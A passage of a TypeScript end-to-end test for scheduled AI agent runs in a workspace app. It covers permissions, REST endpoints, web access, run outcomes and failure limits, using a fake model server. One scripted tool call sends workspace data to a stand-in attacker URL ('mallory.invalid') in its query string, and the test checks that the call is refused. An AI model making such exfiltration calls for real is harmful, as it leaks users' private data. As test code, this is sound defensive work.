/**
 * End-to-end check of agents' schedules (server/agents/schedules.ts) against the database and a
 * fake OpenAI-compatible server: owners add, change and delete an agent's schedules in the app's
 * functions and over the REST API (those who can only view and interact with it read them, but
 * don't change them; invalid rules, tasks and databases are refused);
 * a due schedule queues one run of the agent, held to the owner who set it, that reads the database
 * first, adds, changes and comments on its rows (and only its rows), and ends with a report in that
 * owner's inbox; its history names the schedule. A schedule whose last run still waits skips a
 * run; a paused agent or a database in the trash skips runs; whoever set it losing edit access to
 * the agent pauses it ("accessLost") until set again, as does archiving the agent ("agentGone").
 * With web access, a schedule's run searches, reads the pages of its task and of its searches'
 * results, and refuses any other read at once. A run may end itself with finish_run: quietly when
 * it found nothing new (no report; refused after a change or a call that wasn't made), or as
 * failed with its reason.
 * Through the trigger layer (server/triggers.ts): a schedule's runs join one conversation kept for
 * it (key `schedule:<id>`); a run that fails counts toward its failures in a row, one that goes well
 * counts them from 0, and the tenth in a row turns it off and tells whoever set it; times missed
 * make one run; listTriggers lists what starts the agent. A person's own request on a schedule
 * (server/own-requests.ts) is asked as their own AI chat by the worker, in their conversation kept
 * for it, and counts its failures the same way.
 * Creates its own users and workspace and deletes them afterwards.
 *
 *   pnpm tsx scripts/agent-schedule-e2e.ts
 *
 * Env: DATABASE_URL (read from .env when present). Migrations must be applied. Run it with no app
 * server on the same database: the server's workers would take the schedules and runs.
 */
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { API_TOKEN_SCOPES as ALL_SCOPES } from "@/lib/api-scopes";

try {
  process.loadEnvFile();
} catch {}

// Imported after .env is loaded: the database client reads DATABASE_URL when it is created.
const { and, eq, inArray, sql } = await import("drizzle-orm");
const { db } = await import("@/db");
const { agentDailyChange, agentRun, agentShare, auditEvent, conversation, notification, page, schedule, teamspace, user, workspace, workspaceAgent, workspaceMember } = await import("@/db/schema");
const { SCHEDULE_FAILURE_LIMIT } = await import("@/lib/schedule");
const { changeDay } = await import("@/lib/quiet-hours");
const { registerCollab } = await import("@/server/collab/bridge");
const { createCollab } = await import("@/server/collab/service");
const { archivePage, createPage, restorePage } = await import("@/server/pages");
const { addProperty, createRows } = await import("@/server/databases");
const { MAX_AGENT_WRITES } = await import("@/lib/agents");
const { setAiEnv } = await import("@/server/ai/testing");
const { startFakeOpenAi, textOf } = await import("@/server/ai/fake-openai");
type FakeChatRequest = import("@/server/ai/fake-openai").FakeChatRequest;
type FakeReply = import("@/server/ai/fake-openai").FakeReply;
const agents = await import("@/server/agents/manage");
const agentSchedules = await import("@/server/agents/schedules");
const { flushAgentRuns } = await import("@/server/agents/run");
const { agentThread } = await import("@/server/agents/chat");
const { runDueSchedules } = await import("@/server/schedules");
// Registers the own_request schedule kind, as server.ts does.
const ownRequests = await import("@/server/own-requests");
const { listTriggers } = await import("@/server/triggers");
const { listNotifications } = await import("@/server/notifications");
const { createApiToken } = await import("@/server/api/tokens");
const { handleApiRequest } = await import("@/server/api");
const { dayString, localDay } = await import("@/lib/time-zone");

const RUN = `agent-schedule-e2e-${Date.now().toString(36)}`;

const { hocuspocus, service } = createCollab();
registerCollab(service);
const fake = await startFakeOpenAi();
setAiEnv({ AI_PROVIDER: "openai-compatible", AI_MODEL: "fake-chat", AI_BASE_URL: fake.baseUrl, AI_WORKSPACE_RATE_LIMIT: "1000", AI_RATE_LIMIT: "1000" });

let passed = 0;
function check(condition: unknown, label: string, detail?: unknown): asserts condition {
  if (!condition) {
    console.error(`FAIL  ${label}`);
    if (detail !== undefined) console.error(JSON.stringify(detail, null, 2));
    throw new Error(`Check failed: ${label}`);
  }
  passed++;
  console.log(`ok    ${label}`);
}

async function failsWith(promise: Promise<unknown>, code: string, reason?: string) {
  return promise.then(
    () => false,
    (error: unknown) => {
      const e = error as { code?: unknown; params?: Record<string, string> };
      return e.code === code && (reason === undefined || e.params?.reason === reason);
    },
  );
}

const toolResults = (request: FakeChatRequest) => request.messages.filter((m) => m.role === "tool").map((m) => textOf(m.content));

/** A model that makes these tool calls, one turn each, then says `done`. */
function caller(calls: { name: string; arguments: Record<string, unknown> }[], done: string) {
  return (request: FakeChatRequest): FakeReply => {
    const made = request.messages.filter((m) => m.role === "assistant" && m.tool_calls?.length).length;
    if (made < calls.length) return { toolCalls: [calls[made]] };
    return { text: done };
  };
}

type Json = Record<string, any>;
async function api(token: string, method: string, path: string, body?: unknown): Promise<{ status: number; json: Json }> {
  const res = await handleApiRequest(
    new Request(`http://localhost/api/v1${path}`, {
      method,
      headers: { authorization: `Bearer ${token}`, ...(body !== undefined ? { "content-type": "application/json" } : {}) },
      ...(body !== undefined ? { body: JSON.stringify(body) } : {}),
    }),
  );
  return { status: res.status, json: (await res.json().catch(() => ({}))) as Json };
}

const ids = { owner: `${RUN}-owner`, member: `${RUN}-member` };
const userIds = Object.values(ids);
const workspaceId = `${RUN}-ws`;
const ZONE = "Europe/Istanbul";
const daily = { frequency: "daily", interval: 1, weekdays: [], time: "08:00" };

/** Makes a schedule due now, and runs what is due. */
async function runNow(scheduleId: string) {
  await db.update(schedule).set({ nextRunAt: new Date(Date.now() - 60_000) }).where(eq(schedule.id, scheduleId));
  return runDueSchedules(new Date());
}
const runsOf = (agentId: string) => db.select().from(agentRun).where(eq(agentRun.agentId, agentId));
const scheduleRow = async (id: string) => (await db.select().from(schedule).where(eq(schedule.id, id)))[0];

try {
  await db.insert(user).values([
    { id: ids.owner, name: "Owner Olcay", email: `${ids.owner}@example.test` },
    { id: ids.member, name: "Member Mert", email: `${ids.member}@example.test` },
  ]);
  await db.insert(workspace).values({ id: workspaceId, name: RUN });
  await db.insert(workspaceMember).values([
    { workspaceId, userId: ids.owner, role: "owner" },
    { workspaceId, userId: ids.member, role: "member" },
  ]);
  const [general] = await db.select({ id: teamspace.id }).from(teamspace).where(eq(teamspace.workspaceId, workspaceId));
  const owner = { userId: ids.owner };
  const board = await createPage(owner, { workspaceId, teamspaceId: general.id, kind: "database", title: "Work board" });
  await addProperty(ids.owner, board.id, { name: "Stage", type: "select", options: ["Todo", "Late", "Done"] });
  const [report, release] = await createRows(ids.owner, board.id, [{ title: "Write the quarterly report" }, { title: "Ship release 2.1" }]);
  const other = await createPage(owner, { workspaceId, teamspaceId: general.id, kind: "database", title: "Other board" });
  const [elsewhere] = await createRows(ids.owner, other.id, [{ title: "Not this one" }]);
  const notes = await createPage(owner, { workspaceId, teamspaceId: general.id, title: "Notes" });

  const keeper = await agents.createAgent(ids.owner, workspaceId, { name: "Board keeper", instructions: "Keep the work board's statuses up to date." });
  await agents.setAgentAccess(ids.owner, keeper.id, board.id, "edit");
  await agents.setAgentAccess(ids.owner, keeper.id, other.id, "edit");

  // ── Setting schedules ─────────────────────────────────────────────────────────────────────────
  const task = "Go through every row: set Stage to Late where it is overdue, and tell me what I need to do today.";
  check(
    await failsWith(agentSchedules.setAgentSchedule(ids.member, keeper.id, null, { rule: daily, timeZone: ZONE, task }), "notAllowed"),
    "a member who can only view and interact with the agent can't set its schedule",
  );
  check(
    await failsWith(agentSchedules.setAgentSchedule(ids.owner, keeper.id, null, { rule: { ...daily, time: "25:00" }, timeZone: ZONE, task }), "invalid", "repeat"),
    "an invalid rule is refused",
  );
  check(
    await failsWith(agentSchedules.setAgentSchedule(ids.owner, keeper.id, null, { rule: daily, timeZone: "Mars/Olympus", task }), "invalid", "repeat"),
    "an unknown time zone is refused",
  );
  check(await failsWith(agentSchedules.setAgentSchedule(ids.owner, keeper.id, null, { rule: daily, timeZone: ZONE, task: "  " }), "invalid", "task"), "a schedule needs a task");
  check(
    await failsWith(agentSchedules.setAgentSchedule(ids.owner, keeper.id, null, { rule: daily, timeZone: ZONE, task, databaseId: notes.id }), "notADatabase"),
    "a page that isn't a database is refused",
  );
  check(
    await failsWith(agentSchedules.setAgentSchedule(ids.owner, keeper.id, null, { rule: daily, timeZone: ZONE, task, databaseId: report.id }), "notADatabase"),
    "a row isn't a database either",
  );

  const before = new Date();
  const set = await agentSchedules.setAgentSchedule(ids.owner, keeper.id, null, { rule: daily, timeZone: ZONE, task, databaseId: board.id });
  const next = new Date(set.nextRunAt!);
  const istanbul = new Intl.DateTimeFormat("en-GB", { timeZone: ZONE, hour: "2-digit", minute: "2-digit", hourCycle: "h23" }).format(next);
  check(
    set.enabled &&
      set.rule.start === dayString(localDay(before.getTime(), ZONE)) &&
      istanbul === "08:00" &&
      next > before &&
      next.getTime() - before.getTime() <= 24 * 3_600_000 &&
      set.databaseTitle === "Work board" &&
      set.agentAccess === "edit" &&
      set.setBy?.id === ids.owner,
    "an owner adds a daily schedule at 08:00 in their time zone (starting today), on the board",
    set,
  );
  const listed = await agentSchedules.listAgentSchedules(ids.owner, keeper.id);
  check(listed.length === 1 && listed[0].id === set.id && listed[0].task === task, "the agent's schedules list it");
  const audited = await db.select({ action: auditEvent.action }).from(auditEvent).where(and(eq(auditEvent.workspaceId, workspaceId), eq(auditEvent.action, "agent.schedule_set")));
  check(audited.length === 1, "the audit log records it");

  // ── A due schedule runs the agent ────────────────────────────────────────────────────────────
  fake.chats.length = 0;
  fake.setChat(
    caller(
      [
        { name: "update_row", arguments: { row_id: report.id, properties: { Stage: "Late" } } },
        { name: "update_row", arguments: { row_id: elsewhere.id, properties: { Stage: "Late" } } },
        { name: "create_row", arguments: { database_id: board.id, title: "Plan release 2.2", properties: { Stage: "Todo" } } },
        { name: "create_row", arguments: { database_id: other.id, title: "Not added here" } },
        { name: "add_comment", arguments: { row_id: release.id, text: "Who owns this release?" } },
        // More changes than a row's run may make: a run on a database is held to its own limit.
        ...Array.from({ length: MAX_AGENT_WRITES }, (_, i) => ({ name: "add_comment", arguments: { row_id: report.id, text: `Reminder ${i + 1}` } })),
      ],
      "Marked the quarterly report Late. Today: finish the quarterly report; say who owns release 2.1.",
    ),
  );
  check((await runNow(set.id)) === 1, "the scheduler takes the due schedule");
  let runs = await runsOf(keeper.id);
  check(
    runs.length === 1 &&
      runs[0].status === "pending" &&
      runs[0].source.kind === "schedule" &&
      runs[0].source.scheduleId === set.id &&
      runs[0].source.scheduledBy === ids.owner &&
      runs[0].source.databaseId === board.id &&
      runs[0].prompt === task,
    "it queues one run of the agent, with the schedule as its source",
    runs,
  );
  const moved = await scheduleRow(set.id);
  check(moved.nextRunAt! > new Date() && moved.enabled, "the schedule's next run moved on");
  // The trigger layer: a schedule's runs go to one conversation kept for it, the agent's own.
  const [scheduleConversation] = runs[0].conversationId ? await db.select().from(conversation).where(eq(conversation.id, runs[0].conversationId)) : [];
  check(
    scheduleConversation?.key === `schedule:${set.id}` && scheduleConversation.agentId === keeper.id && scheduleConversation.userId === keeper.userId,
    "its run joins the conversation kept for the schedule, which belongs to the agent's own user",
    scheduleConversation,
  );
  check((await runNow(set.id)) === 1 && (await runsOf(keeper.id)).length === 1, "while its run still waits, the schedule skips one rather than piling up");

  await flushAgentRuns();
  runs = await runsOf(keeper.id);
  const done = runs[0];
  check(done.status === "done" && done.answer.startsWith("Marked the quarterly report Late"), "the run finishes with the agent's report", done);
  const first = fake.chats[0];
  const prompt = first.messages.map((m) => textOf(m.content)).join("\n");
  check(
    prompt.includes("Write the quarterly report") && prompt.includes("Ship release 2.1") && prompt.includes("Owner Olcay set a schedule") && prompt.includes(task),
    "its prompt carries the board's rows, who set the schedule and the task",
  );
  check(
    ["create_row", "update_row", "add_comment"].every((name) => first.tools?.some((t) => t.function.name === name)),
    "it may add, change and comment on rows",
  );
  check(first.tools?.some((t) => t.function.name === "remember"), "on a board people of the workspace wrote, it may propose notes (the owner stands behind it)");
  const results = toolResults(fake.chats.at(-1)!);
  check(results.some((r) => r.includes("only rows of the database this run looks after")), "a row of another database is refused", results);
  const [reportRow] = await db.select({ properties: page.properties }).from(page).where(eq(page.id, report.id));
  const [elsewhereRow] = await db.select({ properties: page.properties }).from(page).where(eq(page.id, elsewhere.id));
  // Select values are kept as option ids: the board's row has one now, the other database's row none.
  check(Object.keys(reportRow.properties).length === 1 && !Object.keys(elsewhereRow.properties).length, "it changed the board's row, not the other database's", {
    reportRow,
    elsewhereRow,
    steps: done.steps,
    results,
  });
  check(done.steps.some((s) => s.kind === "comment" && s.pageId === release.id && s.outcome === "done"), "it commented on another row of the board", done.steps);
  const newRows = await db.select({ parentId: page.parentId, title: page.title }).from(page).where(and(inArray(page.parentId, [board.id, other.id]), inArray(page.title, ["Plan release 2.2", "Not added here"])));
  check(
    newRows.length === 1 && newRows[0].parentId === board.id && results.some((r) => r.includes("add rows only to the database this run looks after")),
    "it added a row to the board, and one to another database is refused",
    { newRows, results },
  );
  // With the row it changed, more changes than a row's run may make.
  const comments = done.steps.filter((s) => s.kind === "comment" && s.outcome === "done").length;
  check(comments === MAX_AGENT_WRITES + 1, `it may make more than a row's run's ${MAX_AGENT_WRITES} changes`, { comments, steps: done.steps });

  const inbox = await listNotifications(ids.owner, { workspaceId });
  const reported = inbox.find((n) => n.kind === "agent_report");
  check(
    reported?.report?.runId === done.id && reported.report.status === "done" && reported.report.text?.startsWith("Marked the quarterly report Late") && reported.report.agentName === "Board keeper",
    "the owner who set the schedule finds the run's report in their inbox",
    reported,
  );
  check(!(await listNotifications(ids.member, { workspaceId })).some((n) => n.kind === "agent_report"), "no one else gets it");
  const history = await agents.listAgentRuns(ids.owner, keeper.id);
  check(
    history[0].schedule?.id === set.id && history[0].schedule.byName === "Owner Olcay" && history[0].schedule.task === task && history[0].schedule.databaseTitle === "Work board",
    "its history says a schedule started it, who set it, the task and the board",
    history[0],
  );

  // ── REST ──────────────────────────────────────────────────────────────────────────────────────
  const token = (await createApiToken(ids.owner, { name: "Schedules", scopes: ALL_SCOPES })).secret;
  const memberToken = (await createApiToken(ids.member, { name: "Member", scopes: ALL_SCOPES })).secret;
  const restList = await api(token, "GET", `/agents/${keeper.id}/schedules`);
  check(
    restList.status === 200 && restList.json.schedules[0].schedule_id === set.id && restList.json.schedules[0].database.agent_access === "edit",
    "the REST API lists an agent's schedules",
    restList,
  );
  const added = await api(token, "POST", `/agents/${keeper.id}/schedules`, {
    repeat: { frequency: "weekly", weekdays: [1, 4], time: "17:30" },
    time_zone: ZONE,
    task: "Summarize the week.",
  });
  check(added.status === 201 && added.json.repeat.weekdays.join() === "1,4" && added.json.database === null, "…adds one (weekly, on no database)", added);
  const changed = await api(token, "PATCH", `/agents/${keeper.id}/schedules/${added.json.schedule_id}`, { task: "Summarize the week, briefly." });
  check(changed.status === 200 && changed.json.task === "Summarize the week, briefly." && changed.json.repeat.time === "17:30", "…changes only what it is given", changed);
  const byMember = await api(memberToken, "GET", `/agents/${keeper.id}/schedules`);
  check(byMember.status === 200 && byMember.json.schedules.length === 2, "…lets a member it is shared with read them", byMember);
  const addedByMember = await api(memberToken, "POST", `/agents/${keeper.id}/schedules`, { repeat: { frequency: "daily", time: "09:00" }, time_zone: ZONE, task: "x" });
  check(addedByMember.status === 403, "…and refuses them a change at view & interact", addedByMember);
  const deleted = await api(token, "DELETE", `/agents/${keeper.id}/schedules/${added.json.schedule_id}`);
  const deletedAgain = await api(token, "DELETE", `/agents/${keeper.id}/schedules/${added.json.schedule_id}`);
  check(deleted.status === 200 && deletedAgain.status === 404, "…and deletes one", { deleted, deletedAgain });

  // ── What keeps a schedule from running ────────────────────────────────────────────────────────
  await agents.updateAgent(ids.owner, keeper.id, { enabled: false });
  await runNow(set.id);
  check((await runsOf(keeper.id)).length === 1 && (await scheduleRow(set.id)).enabled, "a paused agent's schedule skips its run and stays on");
  await agents.updateAgent(ids.owner, keeper.id, { enabled: true });

  await archivePage(ids.owner, board.id);
  await runNow(set.id);
  check((await runsOf(keeper.id)).length === 1 && (await scheduleRow(set.id)).enabled, "nothing runs while the board is in the trash");
  const whileTrashed = await agentSchedules.setAgentSchedule(ids.owner, keeper.id, set.id, { rule: { ...daily, time: "07:30" } });
  check(whileTrashed.rule.time === "07:30" && whileTrashed.databaseId === board.id && whileTrashed.task === task, "its schedule can still be changed meanwhile, keeping the board");
  check(
    await failsWith(agentSchedules.setAgentSchedule(ids.owner, keeper.id, null, { rule: daily, timeZone: ZONE, task, databaseId: board.id }), "notADatabase"),
    "…but a new schedule can't take a board in the trash",
  );
  await restorePage(ids.owner, board.id);

  await agents.removeAgentAccess(ids.owner, keeper.id, board.id);
  const unshared = (await agentSchedules.listAgentSchedules(ids.owner, keeper.id)).find((s) => s.id === set.id);
  await runNow(set.id);
  check(
    unshared?.agentAccess === "none" && (await runsOf(keeper.id)).length === 1 && (await scheduleRow(set.id)).enabled,
    "while the board isn't shared with the agent, the schedule skips its runs (and says why) rather than failing them",
  );
  await agents.setAgentAccess(ids.owner, keeper.id, board.id, "edit");

  // No longer an owner, and the entry they got for creating the agent narrowed to view & interact.
  const ownerRow = and(eq(workspaceMember.workspaceId, workspaceId), eq(workspaceMember.userId, ids.owner));
  const creatorEntry = and(eq(agentShare.agentId, keeper.id), eq(agentShare.userId, ids.owner));
  const demote = async () => {
    await db.update(workspaceMember).set({ role: "member" }).where(ownerRow);
    await db.update(agentShare).set({ level: "interact" }).where(creatorEntry);
  };
  const promote = async () => {
    await db.update(workspaceMember).set({ role: "owner" }).where(ownerRow);
    await db.update(agentShare).set({ level: "full" }).where(creatorEntry);
  };
  await demote();
  await runNow(set.id);
  await promote();
  let paused = await scheduleRow(set.id);
  check(!paused.enabled && paused.lastError === "accessLost" && (await runsOf(keeper.id)).length === 1, "whoever set it losing edit access to the agent pauses it (accessLost)", paused);
  const resumed = await agentSchedules.setAgentSchedule(ids.owner, keeper.id, set.id, {});
  check(resumed.enabled && resumed.lastError === null && resumed.task === task && resumed.databaseId === board.id, "setting it again turns it back on, keeping what it had");

  // A run queued before its owner was demoted opens nothing.
  fake.setChat(() => ({ text: "should not run" }));
  await runNow(set.id);
  await demote();
  await flushAgentRuns();
  await promote();
  const [held] = (await runsOf(keeper.id)).filter((r) => r.id !== done.id);
  check(held?.status === "failed" && held.code === "noAccess", "a run whose schedule's setter can no longer edit the agent opens nothing", held);
  const failedReport = (await listNotifications(ids.owner, { workspaceId })).find((n) => n.report?.runId === held.id);
  check(failedReport?.report?.status === "failed", "a failed run reports too");

  // A row no one in the workspace stands behind (an anonymous form answer): the run proposes no
  // notes (and would ask an owner before each connection tool).
  await db.update(page).set({ createdBy: null }).where(eq(page.id, release.id));
  fake.chats.length = 0;
  fake.setChat(() => ({ text: "Nothing needs you." }));
  await runNow(set.id);
  await flushAgentRuns();
  const untrusted = fake.chats[0];
  check(untrusted && !untrusted.tools?.some((t) => t.function.name === "remember"), "over a board with an anonymous row, it proposes no notes", untrusted?.tools?.map((t) => t.function.name));
  await db.update(page).set({ createdBy: ids.owner }).where(eq(page.id, release.id));

  // ── Web access ────────────────────────────────────────────────────────────────────────────────
  // No one watches a schedule's run: it searches freely and reads the pages of its task and of its
  // own searches' results; any other read is refused at once rather than left waiting for an owner.
  const searchService = createServer((_req, res) => {
    res.setHeader("content-type", "application/json");
    res.end(JSON.stringify({ results: [{ title: "Acme opens a bakery", url: "https://press.invalid/acme-opens", content: "Acme opens." }] }));
  });
  await new Promise<void>((resolve) => searchService.listen(0, "127.0.0.1", resolve));
  process.env.WEB_SEARCH_URL = `http://127.0.0.1:${(searchService.address() as AddressInfo).port}/`;
  try {
    await agents.updateAgent(ids.owner, keeper.id, { webAccess: true });
    const watcher = await agentSchedules.setAgentSchedule(ids.owner, keeper.id, null, {
      rule: daily,
      timeZone: ZONE,
      task: "Read https://news.invalid/acme and search the web for news about Acme.",
    });
    fake.chats.length = 0;
    fake.setChat(
      caller(
        [
          { name: "search_web", arguments: { query: "acme quarterly report leak" } },
          { name: "read_web_page", arguments: { url: "https://press.invalid/acme-opens" } },
          { name: "read_web_page", arguments: { url: "https://news.invalid/acme" } },
          { name: "read_web_page", arguments: { url: "https://mallory.invalid/?d=quarterly+report" } },
        ],
        "Nothing new about Acme.",
      ),
    );
    await runNow(watcher.id);
    await flushAgentRuns();
    const watched = (await runsOf(keeper.id)).find((r) => r.source.kind === "schedule" && r.source.scheduleId === watcher.id);
    const webSteps = (watched?.steps ?? []).flatMap((s) => (s.kind === "tool" && s.connectionId === null ? [`${s.tool} ${s.outcome}`] : []));
    // The pages it may read are tried (and fail: .invalid has no hosts); the other is never sent.
    check(
      watched?.status === "done" && webSteps.join() === "search_web done,read_web_page failed,read_web_page failed,read_web_page refused",
      "a schedule's run searches, reads its task's and its searches' pages, and refuses any other read without waiting",
      { status: watched?.status, webSteps },
    );
    const webResults = toolResults(fake.chats.at(-1)!);
    check(webResults.at(-1)?.includes("nothing was sent"), "…telling the agent nothing was sent", webResults);
    check(
      fake.chats[0].messages.some((m) => textOf(m.content).includes("No one approves calls on this run")),
      "…and its prompt says which pages it may read",
    );
    await agentSchedules.removeAgentSchedule(ids.owner, keeper.id, watcher.id);
    await agents.updateAgent(ids.owner, keeper.id, { webAccess: false });
  } finally {
    delete process.env.WEB_SEARCH_URL;
    searchService.close();
  }

  // ── Ending a run itself (finish_run) ──────────────────────────────────────────────────────────
  const reportsFor = async (runId: string) => (await listNotifications(ids.owner, { workspaceId })).filter((n) => n.kind === "agent_report" && n.report?.runId === runId);
  const latestRun = async () => (await runsOf(keeper.id)).sort((a, b) => b.createdAt.getTime() - a.createdAt.getTime())[0];
  // Nothing new: one turn, and a call after finish_run in the same turn isn't made.
  fake.chats.length = 0;
  fake.setChat(() => ({
    toolCalls: [
      { name: "finish_run", arguments: { outcome: "nothing_new", reason: "No row is overdue." } },
      { name: "add_comment", arguments: { row_id: release.id, text: "Never written" } },
    ],
  }));
  await runNow(set.id);
  await flushAgentRuns();
  const quietRun = await latestRun();
  check(
    quietRun.status === "done" && quietRun.quiet && quietRun.code === null && quietRun.answer === "No row is overdue." && fake.chats.length === 1,
    "finish_run nothing_new ends a schedule's run at once, quiet, keeping its reason",
    { quietRun, turns: fake.chats.length },
  );
  check(
    fake.chats[0].tools?.some((t) => t.function.name === "finish_run") && fake.chats[0].messages.some((m) => textOf(m.content).includes('call finish_run with outcome "nothing_new"')),
    "a schedule's run is offered finish_run, and its prompt says when to use it",
  );
  check(!quietRun.steps.some((s) => s.kind === "comment"), "a call after finish_run in the same turn isn't made", quietRun.steps);
  check((await reportsFor(quietRun.id)).length === 0, "a quiet run sends no report (nothing in the inbox, push or Telegram)");
  const quietHistory = (await agents.listAgentRuns(ids.owner, keeper.id)).find((r) => r.id === quietRun.id);
  const quietThread = (await agentThread(ids.owner, workspaceId, keeper.id)).runs.find((r) => r.id === quietRun.id);
  const quietRest = await api(token, "GET", `/agents/${keeper.id}/runs/${quietRun.id}`);
  check(
    quietHistory?.quiet === true && quietThread?.quiet === true && quietThread.answer === "No row is overdue." && quietRest.json.quiet === true && quietRest.json.answer === "No row is overdue.",
    "the run's history, the chat with the agent and the REST API mark it quiet, with its reason",
    { quietHistory, quietThread, quietRest },
  );

  // Nothing new after a change is refused: the change is reported, its first paragraph in the inbox.
  fake.chats.length = 0;
  fake.setChat(
    caller(
      [
        { name: "add_comment", arguments: { row_id: release.id, text: "Still no owner?" } },
        { name: "finish_run", arguments: { outcome: "nothing_new" } },
      ],
      "Asked again who owns release 2.1.\n\n- **Release 2.1**: no owner yet",
    ),
  );
  await runNow(set.id);
  await flushAgentRuns();
  const changedRun = await latestRun();
  const refusal = toolResults(fake.chats.at(-1)!).at(-1);
  check(
    changedRun.status === "done" && !changedRun.quiet && changedRun.answer.startsWith("Asked again") && refusal?.includes("write your report"),
    "finish_run nothing_new after a change is refused, and the run reports what it changed",
    { changedRun, refusal },
  );
  const changedReport = await reportsFor(changedRun.id);
  check(
    changedReport.length === 1 && changedReport[0].report?.text === "Asked again who owns release 2.1.",
    "its report in the inbox shows the answer's first paragraph as a line",
    changedReport,
  );

  // Nothing new after a call that wasn't made (here past the day's limit) is refused too: the run reports it.
  await agents.updateAgent(ids.owner, keeper.id, { dailyChangeLimit: 1 });
  await db.insert(agentDailyChange).values({ agentId: keeper.id, day: changeDay(new Date(), null), count: 1 }).onConflictDoUpdate({ target: [agentDailyChange.agentId, agentDailyChange.day], set: { count: 1 } });
  fake.chats.length = 0;
  fake.setChat(
    caller(
      [
        { name: "add_comment", arguments: { row_id: release.id, text: "Over the limit" } },
        { name: "finish_run", arguments: { outcome: "nothing_new" } },
      ],
      "Couldn't comment on release 2.1: the day's changes are used up.",
    ),
  );
  await runNow(set.id);
  await flushAgentRuns();
  const blockedRun = await latestRun();
  const blockedRefusal = toolResults(fake.chats.at(-1)!).at(-1);
  check(
    blockedRun.status === "done" && !blockedRun.quiet && blockedRun.steps.some((s) => s.kind === "tool" && s.outcome === "limited") && blockedRefusal?.includes("wasn't made") && blockedRefusal.includes("write your report"),
    "finish_run nothing_new after a call that wasn't made is refused, and the run reports it",
    { blockedRun, blockedRefusal },
  );
  check((await reportsFor(blockedRun.id)).length === 1, "…in the inbox");
  await agents.updateAgent(ids.owner, keeper.id, { dailyChangeLimit: null });

  // Failed: the run fails as selfReported, with its reason, and still reports.
  fake.setChat(() => ({ toolCalls: [{ name: "finish_run", arguments: { outcome: "failed", reason: "The board has no due dates to check." } }] }));
  await runNow(set.id);
  await flushAgentRuns();
  const failedRun = await latestRun();
  check(
    failedRun.status === "failed" && failedRun.code === "selfReported" && failedRun.answer === "The board has no due dates to check." && !failedRun.quiet,
    "finish_run failed ends the run as failed (selfReported), keeping the reason",
    failedRun,
  );
  const failedReported = await reportsFor(failedRun.id);
  check(
    failedReported.length === 1 && failedReported[0].report?.status === "failed" && failedReported[0].report.code === "selfReported" && failedReported[0].report.text === "The board has no due dates to check.",
    "…and reports, the reason as its inbox line",
    failedReported,
  );
  check(failedRun.conversationId === scheduleConversation.id, "each run of the schedule joins the same conversation", failedRun.conversationId);

  // ── Failing again and again turns it off ─────────────────────────────────────────────────────
  check((await scheduleRow(set.id)).failures >= 1, "a failed run counts toward the schedule's failures in a row");
  await db.update(schedule).set({ failures: 4 }).where(eq(schedule.id, set.id));
  fake.setChat(() => ({ text: "All on track." }));
  await runNow(set.id);
  await flushAgentRuns();
  check((await latestRun()).status === "done" && (await scheduleRow(set.id)).failures === 0, "a run that goes well counts them from 0 again");
  await db.update(schedule).set({ failures: SCHEDULE_FAILURE_LIMIT - 2 }).where(eq(schedule.id, set.id));
  fake.setChat(() => ({ toolCalls: [{ name: "finish_run", arguments: { outcome: "failed", reason: "Still no due dates." } }] }));
  await runNow(set.id);
  await flushAgentRuns();
  check((await scheduleRow(set.id)).enabled, "below the limit it stays on");
  await runNow(set.id);
  await flushAgentRuns();
  const offAfterFailures = await scheduleRow(set.id);
  check(
    !offAfterFailures.enabled && offAfterFailures.nextRunAt === null && offAfterFailures.lastError === "failed" && offAfterFailures.failures === SCHEDULE_FAILURE_LIMIT,
    `the ${SCHEDULE_FAILURE_LIMIT}th failure in a row turns the schedule off`,
    offAfterFailures,
  );
  const pausedNotices = (await listNotifications(ids.owner, { workspaceId })).filter((n) => n.kind === "schedule_paused");
  check(
    pausedNotices.length === 1 &&
      pausedNotices[0].schedulePaused?.agentId === keeper.id &&
      pausedNotices[0].schedulePaused.agentName === "Board keeper" &&
      pausedNotices[0].schedulePaused.failures === SCHEDULE_FAILURE_LIMIT &&
      pausedNotices[0].schedulePaused.task === task.slice(0, 200),
    "…and tells whoever set it, once, naming the agent and the task",
    pausedNotices,
  );
  check(!(await listNotifications(ids.member, { workspaceId })).some((n) => n.kind === "schedule_paused"), "…and no one else");
  const runsWhenOff = (await runsOf(keeper.id)).length;
  await runNow(set.id);
  check((await runsOf(keeper.id)).length === runsWhenOff, "a schedule turned off doesn't run");
  const setAgain = await agentSchedules.setAgentSchedule(ids.owner, keeper.id, set.id, {});
  check(setAgain.enabled && setAgain.failures === 0 && (await scheduleRow(set.id)).failures === 0, "setting it again turns it back on and counts from 0", setAgain);

  // ── Times missed while the server was down make one run, not one each ────────────────────────
  await flushAgentRuns();
  const runsBeforeMissed = (await runsOf(keeper.id)).length;
  fake.setChat(() => ({ text: "Caught up." }));
  await db.update(schedule).set({ nextRunAt: new Date(Date.now() - 5 * 24 * 3_600_000) }).where(eq(schedule.id, set.id));
  await runDueSchedules(new Date());
  await runDueSchedules(new Date());
  const afterMissed = await scheduleRow(set.id);
  check(
    (await runsOf(keeper.id)).length === runsBeforeMissed + 1 && afterMissed.nextRunAt! > new Date(),
    "five days of missed times make one run, and the next time is counted from now",
    { runs: (await runsOf(keeper.id)).length - runsBeforeMissed, nextRunAt: afterMissed.nextRunAt },
  );
  await flushAgentRuns();

  // ── One place lists what starts the agent ────────────────────────────────────────────────────
  const keeperTriggers = await listTriggers(ids.owner, workspaceId, keeper.id);
  const keeperSchedule = keeperTriggers.find((t) => t.kind === "schedule");
  check(
    keeperTriggers.some((t) => t.kind === "chat" && t.available && t.conversation === "fixed") &&
      keeperTriggers.some((t) => t.kind === "mention" && t.conversation === "keyed") &&
      keeperSchedule?.kind === "schedule" &&
      keeperSchedule.id === set.id &&
      keeperSchedule.scheduleKind === "agent" &&
      keeperSchedule.conversation === "keyed" &&
      keeperSchedule.failures === 0,
    "the agent's triggers list its chat, mentions and its schedule, with the conversation each goes to",
    keeperTriggers,
  );

  await agents.archiveAgent(ids.owner, keeper.id);
  await runNow(set.id);
  paused = await scheduleRow(set.id);
  check(!paused.enabled && paused.lastError === "agentGone", "archiving the agent pauses its schedules (agentGone)", paused);
  check(await failsWith(agentSchedules.setAgentSchedule(ids.owner, keeper.id, set.id, {}), "archived"), "an archived agent's schedules can't be set");
  await agents.restoreAgent(ids.owner, keeper.id);
  await agentSchedules.removeAgentSchedule(ids.owner, keeper.id, set.id);
  check(!(await scheduleRow(set.id)), "an owner deletes the schedule");
